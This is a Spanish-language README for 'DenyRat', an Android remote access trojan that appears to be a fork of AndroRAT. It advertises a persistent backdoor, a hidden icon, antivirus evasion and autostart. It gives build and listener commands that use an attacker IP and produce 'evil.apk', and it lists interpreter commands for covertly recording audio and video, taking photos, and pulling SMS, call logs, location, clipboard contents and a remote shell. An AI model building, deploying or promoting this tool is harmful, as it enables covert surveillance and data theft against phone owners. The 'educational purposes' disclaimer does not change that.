**Disclaimer** : Este software está destinado únicamente a fines educativos. El presente autor no es responsable de ningún uso malintencionado de la aplicación.
# DenyRat 

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
[![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
[![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)

DenyRat es una herramienta diseñada para dar el control del sistema Android de forma remota y recuperar información de él. DenyRat es una aplicación cliente / servidor desarrollada en Java Android para el lado del cliente y el servidor está en Python.

##### DenyRat trabaja en dispositivos con Android 4.1 (Jelly Bean) a Android 9.0 (Oreo) (API 16 a API 28)

> DenyRat también funciona en Android 10 (Q) pero parte del comando del intérprete será inestable. 

## Screenshots

![AndroRAT](https://github.com/karma9874/AndroRAT/blob/master/Screenshots/5.jpg "AndroRAT in action")
## Caracteristicas de DenyRat
* Puerta trasera persistente completa
* Totalmente indetectable por cualquier escáner antivirus [(VirusTotal](https://github.com/karma9874/AndroRAT/blob/master/Screenshots/virusTotal.JPG))
* Icono invisible en la instalación
* APK de peso ligero que funciona 24 * 7 en segundo plano
* La aplicación se inicia automáticamente al arrancar
* Puede grabar audio, video, tomar fotos de ambas cámaras
* Examinar registros de llamadas y registros de SMS
* Obtenga la ubicación actual, los detalles de la tarjeta SIM, ip, dirección mac del dispositivo

## Pre requisitos
DenyRat requiere Python (> 3.6) y JAVA 8 (o Android Studio)

## Instalacion
```
git clone https://github.com/DanyMilan23/BotAndroid.git
pip install colorama
```
## Uso (Windows y Linux)
### Modos disponibles
* `--build` - para construir la apk
* `--shell` - brinda un shell interactivo
### `build` modo
```
Usage:
  python main.py --build [flags]
  Flags:
    -i, --ip                Direccion IP del atacante (requerido)
    -p, --port              Numero del puerto del atacante (requerido)
    -o, --output            Nombre del archivo de apk (opcional)
```
### `shell` modo
```
Usage:
  python main.py --shell [flags]
  Flags:
    -i, --ip                Escuchar la direccion IP
    -p, --port              Escuchar el numero de pueto
```
Despues de correr `shell` se mostrara un interprete en el cual se interactuara 

Comandos que se pueden ejecutar en la intérprete
```
    deviceInfo -> devuelve información básica del dispositivo
    camList -> devuelve cameraID
    takepic [cameraID] -> Toma una foto de la cámara
    startVideo [cameraID] -> comienza a grabar el video
    stopVideo -> dejar de grabar el video y devolver el archivo de video
    startAudio -> comienza a grabar el audio
    stopAudio -> detener la grabación de audio
    getSMS [inbox | sent] -> devuelve sms de la bandeja de entrada o sms enviados en un archivo
    getCallLogs -> devuelve registros de llamadas en un archivo
    shell -> inicia un shell sh del dispositivo
    vibrar [número_de_veces] -> vibrar el dispositivo número de veces
    getLocation -> devuelve la ubicación actual del dispositivo
    getIP -> devuelve la ip del dispositivo
    getSimDetails -> devuelve los detalles de todas las simulaciones del dispositivo
    clear -> limpia la pantalla
    getClipData -> devuelve el texto guardado actual desde el portapapeles
    getMACAddress -> devuelve la dirección mac del dispositivo
    salir -> salir del intérprete
```
## Examples

* To build the apk:
```python main.py --build -i 192.169.x.x -p 8000 -o evil.apk```

* To get the interpreter:
```python main.py --shell -i 0.0.0.0 -p 8000```
## License
DenyRat is licensed under MIT license take a look at the [LICENSE](https://github.com/karma9874/AndroRAT/blob/master/LICENSE) for more information.


